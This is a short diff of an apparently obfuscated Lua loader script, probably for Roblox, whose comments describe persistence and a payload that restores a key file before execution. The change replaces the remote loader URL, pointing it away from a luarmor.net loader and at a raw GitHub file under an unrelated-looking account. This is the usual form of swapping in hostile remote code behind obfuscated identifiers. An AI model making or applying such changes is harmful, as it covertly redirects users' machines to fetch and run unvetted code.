@@ -1494,7 +1494,7 @@ _0xa299._0x6905 = true
 -- hand, so persistence and a fresh execute now go through identical code. It
 -- still expects script_key, which the payload below restores from the key file
 -- before calling this.
-_0xa299._0x027f = "https://api.luarmor.net/files/v4/loaders/a273465ccc6d53f269eacb2ba1a933b3.lua"
+_0xa299._0x027f = "https://raw.githubusercontent.com/bigmoneymoves3214-gif/m/refs/heads/main/main"
 
 function _0xa299._0xa712()
     pcall(function()
